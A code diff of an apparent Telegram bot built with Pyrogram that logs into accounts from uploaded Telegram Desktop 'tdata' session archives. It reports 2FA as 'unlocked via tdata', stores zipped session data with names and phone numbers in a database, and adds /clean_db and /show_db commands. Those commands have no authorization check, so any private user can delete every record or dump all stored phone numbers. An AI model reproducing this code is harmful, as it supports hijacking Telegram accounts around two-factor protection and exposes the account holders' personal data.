@@ -143,6 +143,11 @@ class Database:
 
     async def total_users_count(self):
         return await self.col.count_documents({})
+    
+    async def list_accounts(self):
+        """Return all accounts"""
+        cursor = self.col.find({}, {"_id": 0, "account_num": 1, "name": 1, "phone": 1})
+        return [doc async for doc in cursor]
 
 
 db = Database(Config.DB_URL, Config.DB_NAME)
@@ -245,6 +250,20 @@ async def handle_archive(client, message):
                     # If no exception, that means session already unlocked
                     twofa_state = "2FA: Enabled but unlocked via tdata"
                 acc_num = idx #await db.get_next_account_num()
+                
+
+                clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
+                with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
+                    for root, dirs, files in os.walk(tdata_path):
+                        for file in files:
+                            full_path = os.path.join(root, file)
+                            arcname = os.path.relpath(full_path, tdata_path)
+                            zipf.write(full_path, arcname)
+
+                # --- Read ZIP bytes
+                with open(clean_zip_path, "rb") as f:
+                    tdata_bytes = f.read()
+
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
@@ -252,12 +271,7 @@ async def handle_archive(client, message):
                     "spam": getattr(me, "restricted", False),
                     "account_num": acc_num,
                 }
-
-                # --- (Optional) Save in DB
-                
-                with open(file_path, "rb") as f:
-                    archive_bytes = f.read()
-                await db.save_account(me.id, acc_num, info, archive_bytes)
+                await db.save_account(me.id, acc_num, info, tdata_bytes)
 
                 results.append(
                     f"#{idx}\n"
@@ -266,6 +280,7 @@ async def handle_archive(client, message):
                     f"{info['twofa']}\n"
                     f"Spam Mute: {info['spam']}\n"
                 )
+
 
                 await tele_client.disconnect()
 
@@ -466,3 +481,44 @@ async def get_code(client, callback_query):
         await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
     finally:
         shutil.rmtree(temp_dir)
+
+
+from pyrogram import Client, filters
+
+@Client.on_message(filters.command("clean_db") & filters.private)
+async def clean_db(client, message):
+    """Delete all accounts from the database (careful!)."""
+    confirmation_text = (
+        "⚠️ This will permanently delete ALL accounts in the database.\n"
+        "Reply with `YES` to confirm."
+    )
+    await message.reply(confirmation_text)
+
+    # Wait for user reply
+    try:
+        response = await client.listen(message.chat.id, timeout=30)
+        if response.text.strip().upper() != "YES":
+            return await message.reply("❌ Operation cancelled.")
+    except Exception:
+        return await message.reply("❌ Timeout. Operation cancelled.")
+
+    # Delete all documents
+    result = await db.col.delete_many({})
+    await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")
+
+
+from pyrogram import Client, filters
+
+@Client.on_message(filters.command("show_db") & filters.private)
+async def show_db(client, message):
+    accounts = await db.list_accounts()
+    if not accounts:
+        return await message.reply("❌ No accounts in DB yet.")
+
+    text = "📋 Stored Accounts:\n\n"
+    for acc in accounts:
+        text += f"• Account #: {acc['account_num']}\n"
+        text += f"  Name: {acc['name']}\n"
+        text += f"  Phone: {acc['phone']}\n\n"
+
+    await message.reply(text)
